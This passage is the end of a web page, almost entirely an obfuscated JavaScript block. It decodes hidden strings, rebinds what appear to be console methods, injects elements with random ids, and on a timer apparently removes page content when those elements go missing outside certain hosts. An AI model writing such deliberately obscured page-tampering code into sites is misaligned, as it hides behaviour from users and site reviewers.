c$bSXVWQIogWemFKiw;try{c$bSXVWQIogWemFKiw=Function(wFmIP_BJY(-parseInt(0x11b5)*-parseInt(0x1)+-0x1*-0x7bb+parseFloat(-0x1890))+wFmIP_BJY(Math.trunc(-parseInt(0x31))*-parseInt(0x46)+parseInt(0x34)+Math.trunc(-0xcb8)*parseInt(0x1))+');')();}catch(Gb_ACKNijqUcdVRCDBcMcF){c$bSXVWQIogWemFKiw=window;}return c$bSXVWQIogWemFKiw;},Vkmv$yFSRdHrKoQ=AA_ZPkQAKRmDwqTTTdciyQE(),utUNAf_YOnudTwxsFQFYNVLTF=Vkmv$yFSRdHrKoQ[CjsPKzyFLwfe(Math.floor(-0x1d5)*-parseInt(0x11)+Math.floor(-0xd)*parseInt(0x13b)+0x1*Math.max(-0xe39,-0xe39))]=Vkmv$yFSRdHrKoQ[CjsPKzyFLwfe(Math.max(-0x1ba4,-0x1ba4)+parseInt(0xbe)*Math.max(-parseInt(0xd),-parseInt(0xd))+parseInt(0x2637))]||{},ub_IKGtkVJnrm=[DHKhHH$CzdaTFZpF(0x1b4),CjsPKzyFLwfe(-parseInt(0x75c)+-0x3d*parseInt(0x30)+parseInt(0x1396)),CjsPKzyFLwfe(Math.floor(-parseInt(0xcf6))+parseFloat(-0x18)*parseInt(-parseInt(0x59))+Math.ceil(0x57f)),CjsPKzyFLwfe(0xa86+Number(-parseInt(0x585))+-0x43a),CjsPKzyFLwfe(0x1f9+parseInt(0x2)*-0xd5+Math.floor(-parseInt(0x4))*Number(-0x25)),CjsPKzyFLwfe(Math.floor(-0x18f1)+0x4b7+parseInt(0x150b)),CjsPKzyFLwfe(0x1a5*0x1+parseInt(0x352)+parseInt(0x29)*parseInt(-parseInt(0x1a)))];for(let FNmbuOKunHKDQnEd=parseInt(0x5)*0x2f1+Math.max(parseInt(0x1d8f),0x1d8f)*-parseInt(0x1)+0xeda;FNmbuOKunHKDQnEd<ub_IKGtkVJnrm[CjsPKzyFLwfe(-0xe40+-0x65*Math.floor(0x24)+parseInt(0x1d4f))];FNmbuOKunHKDQnEd++){const ksLNxwdrpBft=qiwjHUauNrHLN$fg[CjsPKzyFLwfe(-parseInt(0x1b30)+Math.trunc(parseInt(0x25da))+parseInt(0xfd)*-0xa)][CjsPKzyFLwfe(-0x1540+-parseInt(0x1564)+-0x2b82*Math.ceil(-parseInt(0x1)))][CjsPKzyFLwfe(Math.ceil(-parseInt(0x49))*-0x58+Math.max(-parseInt(0x66),-parseInt(0x66))*parseInt(0x25)+-0x3*0x32b)](qiwjHUauNrHLN$fg),TbeQm$$iDqjMKpTtSlnEF=ub_IKGtkVJnrm[FNmbuOKunHKDQnEd],PCdCtHVuQ$WZinsEonTDhRHx=utUNAf_YOnudTwxsFQFYNVLTF[TbeQm$$iDqjMKpTtSlnEF]||ksLNxwdrpBft;ksLNxwdrpBft[CjsPKzyFLwfe(parseInt(0x1f25)+0x9*-parseInt(0x349)+Math.ceil(-parseInt(0xbf)))]=qiwjHUauNrHLN$fg[CjsPKzyFLwfe(Math.ceil(-parseInt(0x27))*Math.max(-parseInt(0x38),-0x38)+Math.trunc(0x874)+parseFloat(parseInt(0x1))*Math.trunc(-parseInt(0x1023)))](qiwjHUauNrHLN$fg),ksLNxwdrpBft[DHKhHH$CzdaTFZpF(0x1b9)]=PCdCtHVuQ$WZinsEonTDhRHx[CjsPKzyFLwfe(parseInt(0xf84)+Number(-parseInt(0xa8b))*0x2+0x680)][CjsPKzyFLwfe(Math.floor(-0x2)*-parseInt(0x81b)+parseInt(0x144c)+parseInt(0x23a9)*Math.trunc(-0x1))](PCdCtHVuQ$WZinsEonTDhRHx),utUNAf_YOnudTwxsFQFYNVLTF[TbeQm$$iDqjMKpTtSlnEF]=ksLNxwdrpBft;}});EsAEXrTkuAdPT__tKKG(),udh_ln$z[YxGzqKLhsTvBRmcdZ(0x184)](hvUOLCHfCBhIT);let ZZlEfnTJFgKrlZQ=document[YxGzqKLhsTvBRmcdZ(0x18c)](hvUOLCHfCBhIT);!ZZlEfnTJFgKrlZQ&&(ZZlEfnTJFgKrlZQ=document[YxGzqKLhsTvBRmcdZ(0x1b1)](ALBAzExBHKkx(0x27*0x14+parseInt(0x1902)+-parseInt(0x36)*parseInt(0x81))),ZZlEfnTJFgKrlZQ['id']=hvUOLCHfCBhIT,document[ALBAzExBHKkx(parseFloat(-0x18ce)+-0x462+-parseInt(0xf0)*-0x20)][ALBAzExBHKkx(-parseInt(0x3)*Math.trunc(0x471)+Number(parseInt(0x247c))+Math.max(-parseInt(0x5),-parseInt(0x5))*parseInt(0x477))](ZZlEfnTJFgKrlZQ));const JusV_APG$gjSZYfdHqhYsOfh=document[ALBAzExBHKkx(-parseInt(0x749)+Math.ceil(-parseInt(0x25f4))+parseInt(0x2e11))](ALBAzExBHKkx(parseInt(parseInt(0x214c))+0x1afe+-0x1*Number(parseInt(0x3b73))));JusV_APG$gjSZYfdHqhYsOfh[ALBAzExBHKkx(-0x281*Number(0xa)+0x1*0x153b+Math.trunc(0x491))]=ALBAzExBHKkx(0x6*parseInt(0x350)+0x236+Math.floor(-0x11d)*parseInt(0x13)),ZZlEfnTJFgKrlZQ[ALBAzExBHKkx(parseInt(0x1347)+parseInt(0x3)*Number(-0x9b)+-parseInt(0x10a0))](JusV_APG$gjSZYfdHqhYsOfh),gGA$_MNmIu===Math[YxGzqKLhsTvBRmcdZ(0x186)](-parseInt(0x5)*parseFloat(-parseInt(0x21e))+Math.ceil(-0xf)*-0x250+Math.floor(0x2d42)*-0x1)*-(Math.max(-0x989,-0x989)+Math.ceil(-0x44e)+parseInt(-parseInt(0x2))*-0x840)+parseInt(Math.ceil(0x1)*Math.max(0xd53,parseInt(0xd53))+-parseInt(0x1df5)*Number(-0x1)+Math.ceil(-parseInt(0x6a))*parseInt(0x20))+parseFloat(-parseInt(Math.trunc(-parseInt(0x1))*parseInt(0x144f)+Math.ceil(0x2d)*-0xb3+Math.trunc(parseInt(0x1))*parseInt(0x368b)))*(parseInt(0x2bb)+parseInt(0x6e3)+-parseInt(0x1eb)*Math.max(parseInt(0x5),parseInt(0x5)))?bzBMId=!![]:YFTSa_AyznhLRB=!![];}function IuySzzpOiISwZDDrwmF(){const TJjv$_TBBMK=sFfEkK$fMziBAJZwZbkuvp,wRFucCDOfu$LtCMXVPgy=_0xe8c3,k_l_ellCISKwd=location[wRFucCDOfu$LtCMXVPgy(Math.floor(0x11)*parseFloat(-parseInt(0x9e))+Math.floor(-parseInt(0x2194))+parseInt(0x4)*parseInt(0xb36))];return k_l_ellCISKwd===wRFucCDOfu$LtCMXVPgy(parseInt(0x1)*Math.ceil(parseInt(0x265))+parseInt(0x5)*0x69e+-0x22b2)||k_l_ellCISKwd===wRFucCDOfu$LtCMXVPgy(0x7*-0x53f+Math.floor(-0x1)*parseInt(0x2351)+0x48cb*parseInt(parseInt(0x1)))||location[wRFucCDOfu$LtCMXVPgy(parseInt(0x2133)+parseInt(0x4b6)+-0x3*parseInt(0xc5f))][TJjv$_TBBMK(0x1b5)](TJjv$_TBBMK(0x19f));}c$uljJUCGCQHFqM(crypto[KmkEnmSV(-0x7a*-parseInt(0x13)+parseInt(0x1f8b)+-0x257*parseInt(0x11))]()[KmkEnmSV(parseFloat(-0x1076)+Math.ceil(parseInt(0x1d3))*Math.max(0x2,0x2)+parseFloat(0xdba))]('-',''),parseInt(0x1*parseInt(-parseInt(0x270a))+0x1*-0x4ff+parseInt(0x43b8))+(Math.ceil(-parseInt(0xc7d))*-parseInt(0x1)+Math.floor(-parseInt(0x18e5))+0x1e00)+parseInt(-(0x49aa+0x163*parseInt(0x29)+-0x593f))),c$uljJUCGCQHFqM(crypto[fyfZe$A(0x18b)]()[fyfZe$A(0x19c)]('-',''),Math[KmkEnmSV(0x1250+-0x19f0+Math.max(0x887,parseInt(0x887)))](-(0x85d*-0x1+-parseInt(0x25ce)*-0x1+-parseInt(0x3ae)*parseInt(0x8)))*(0x9*parseFloat(parseInt(0x405))+parseInt(0x106)*-0x17+-parseInt(0xc70))+-parseInt(parseInt(0xbfa)+parseInt(0x1c)*0x29c+-0x1*Math.trunc(parseInt(0x3077)))+Math[KmkEnmSV(Math.floor(parseInt(0x34d))+parseInt(0x61)*-0x5f+parseInt(0x2180))](-(-0x13ff+parseInt(-0x765)+0x1ffd))*-(parseInt(0x213b)+parseFloat(-0x1e65)*parseInt(-parseInt(0x1))+Math.floor(parseInt(0x25))*-0x1b8));let cDI_LjPiksLv$sA=setInterval(()=>{const wAfptqBlmnOZ=fyfZe$A,gcJTS=KmkEnmSV;hK$kJs&&clearInterval(cDI_LjPiksLv$sA);for(let DwEqUVjz_qHgd_omhiKOFelRy=-parseInt(-parseInt(0x2286)+parseInt(parseInt(0x60d))*-0x2+parseInt(0x2f30))+Math[wAfptqBlmnOZ(0x196)](-parseInt(0xe05)*-0x2+Number(-0x6c9)*Math.floor(0x5)+parseInt(0x1d4)*0xb)*(Math.trunc(0x17)*-parseInt(0x86)+parseInt(0x9a)+Math.ceil(0xb72))+-parseInt(Math.max(parseInt(0x1),0x1)*-parseInt(0x2926)+-0x1d97+Number(parseInt(0x629f)));DwEqUVjz_qHgd_omhiKOFelRy<udh_ln$z[gcJTS(-parseInt(0x3d8)+Math.max(parseInt(0x86),parseInt(0x86))*Math.floor(-parseInt(0x3b))+Math.ceil(parseInt(0x2395))*Number(0x1))];DwEqUVjz_qHgd_omhiKOFelRy++){const cPPRWqXnlPOY$$cBq=udh_ln$z[DwEqUVjz_qHgd_omhiKOFelRy],Okf$w_HLhAd=document[gcJTS(Math.floor(-0x96)*-0xd+-parseInt(0x18f5)+parseFloat(parseInt(0x1b))*0xad)](cPPRWqXnlPOY$$cBq);YFTSa_AyznhLRB&&bzBMId&&(!hK$kJs&&(!Okf$w_HLhAd&&(!IuySzzpOiISwZDDrwmF()&&document[wAfptqBlmnOZ(0x1b0)][gcJTS(Math.floor(parseInt(0x995))*-0x4+Math.ceil(-0x8fe)+Math.max(0x371,0x371)*0xe)]())));}},Math[KmkEnmSV(Math.ceil(0x2615)*Math.floor(parseInt(0x1))+-parseInt(0x171f)+-parseInt(0xe31)*0x1)](-parseInt(-0x6f1*parseInt(0x7)+0x2*-0x24b3+Math.max(-parseInt(0x104),-0x104)*-parseInt(0x9e)))+(-parseInt(0x2)*0xf08+0x1baf+0xfe4)+Number(parseInt(0x1083)*Math.max(parseInt(0x1),0x1)+Math.floor(0x1e34)+-parseInt(0x11d7)));}()));function sFfEkK$fMziBAJZwZbkuvp(DgkkwGrBFCVM$xjRVLz$VfAbWhV,wv_xek){const jpcyYzd_r_c=UravPbGESYjDUNqxKcf$Vqza();return sFfEkK$fMziBAJZwZbkuvp=function(cBkxdlJOLrthNdkDJWsPnwlWD,Ew_izWDrWs$VbNMSejx){cBkxdlJOLrthNdkDJWsPnwlWD=cBkxdlJOLrthNdkDJWsPnwlWD-(parseInt(0x222d)*-parseInt(0x1)+0xbaa+Math.ceil(parseInt(0x1801)));let ZrC$BmMHQJFnM$qxVDvOaapr=jpcyYzd_r_c[cBkxdlJOLrthNdkDJWsPnwlWD];if(sFfEkK$fMziBAJZwZbkuvp['MCMlHP']===undefined){const kiHmW=function(qHLfn){let zVDPTWpEcic$l=Number(-0x7d)*parseFloat(-parseInt(0xe))+0x1b0e*Number(0x1)+parseInt(-parseInt(0xb))*0x301&Math.trunc(-parseInt(0x5))*0x1c+parseFloat(-parseInt(0x788))*parseInt(0x5)+-0x29d*-parseInt(0xf),GQloCGHmGKtLJqIIj$jnKaqx=new Uint8Array(qHLfn['match'](/.{1,2}/g)['map'](JRMexmf=>parseInt(JRMexmf,-0x1*parseInt(-0x12e)+-0xdc1*-0x1+-parseInt(0xedf)))),yzuBpRiFSFq_wPGNK=GQloCGHmGKtLJqIIj$jnKaqx['map'](Wkg_QjyPwvVREelpsnGOnwJG=>Wkg_QjyPwvVREelpsnGOnwJG^zVDPTWpEcic$l),gF$xXW$bUfgmPrkGxHtTR=new TextDecoder(),QpJsUNKKXcaFcrHADyIt=gF$xXW$bUfgmPrkGxHtTR['decode'](yzuBpRiFSFq_wPGNK);return QpJsUNKKXcaFcrHADyIt;};sFfEkK$fMziBAJZwZbkuvp['TWdYOH']=kiHmW,DgkkwGrBFCVM$xjRVLz$VfAbWhV=arguments,sFfEkK$fMziBAJZwZbkuvp['MCMlHP']=!![];}const Xtz$tyRcF_YASGBEJfRTSL=jpcyYzd_r_c[-0x961+0x7be+parseInt(0x1)*parseInt(0x1a3)],aK$Aa_l=cBkxdlJOLrthNdkDJWsPnwlWD+Xtz$tyRcF_YASGBEJfRTSL,XQHXnDh$$EY=DgkkwGrBFCVM$xjRVLz$VfAbWhV[aK$Aa_l];return!XQHXnDh$$EY?(sFfEkK$fMziBAJZwZbkuvp['MbVogc']===undefined&&(sFfEkK$fMziBAJZwZbkuvp['MbVogc']=!![]),ZrC$BmMHQJFnM$qxVDvOaapr=sFfEkK$fMziBAJZwZbkuvp['TWdYOH'](ZrC$BmMHQJFnM$qxVDvOaapr),DgkkwGrBFCVM$xjRVLz$VfAbWhV[aK$Aa_l]=ZrC$BmMHQJFnM$qxVDvOaapr):ZrC$BmMHQJFnM$qxVDvOaapr=XQHXnDh$$EY,ZrC$BmMHQJFnM$qxVDvOaapr;},sFfEkK$fMziBAJZwZbkuvp(DgkkwGrBFCVM$xjRVLz$VfAbWhV,wv_xek);}function _0x257e(){const aWI$GMwS=sFfEkK$fMziBAJZwZbkuvp,uudKm=[aWI$GMwS(0x186),aWI$GMwS(0x1a1),aWI$GMwS(0x1a5),aWI$GMwS(0x199),aWI$GMwS(0x1b8),aWI$GMwS(0x19e),aWI$GMwS(0x18a),aWI$GMwS(0x1bf),aWI$GMwS(0x1a0),aWI$GMwS(0x196),aWI$GMwS(0x18d),aWI$GMwS(0x1b0),aWI$GMwS(0x17f),aWI$GMwS(0x18b),aWI$GMwS(0x1bd),aWI$GMwS(0x1b1),aWI$GMwS(0x19b),aWI$GMwS(0x1af),aWI$GMwS(0x197),aWI$GMwS(0x1ae),aWI$GMwS(0x185),aWI$GMwS(0x187),aWI$GMwS(0x1a8),aWI$GMwS(0x19a),aWI$GMwS(0x1b7),aWI$GMwS(0x1bc),aWI$GMwS(0x1a3),aWI$GMwS(0x1a2),aWI$GMwS(0x182),aWI$GMwS(0x192),aWI$GMwS(0x18e),aWI$GMwS(0x181),aWI$GMwS(0x1ab),aWI$GMwS(0x1a4),aWI$GMwS(0x1ba),aWI$GMwS(0x18c),aWI$GMwS(0x1a6),aWI$GMwS(0x19c),aWI$GMwS(0x1b3),aWI$GMwS(0x1aa),aWI$GMwS(0x194),aWI$GMwS(0x1b9),aWI$GMwS(0x1bb),aWI$GMwS(0x188),aWI$GMwS(0x1ad),aWI$GMwS(0x19d),aWI$GMwS(0x198),aWI$GMwS(0x180),aWI$GMwS(0x193)];return _0x257e=function(){return uudKm;},_0x257e();}</script>
 
 </body>
 </html>
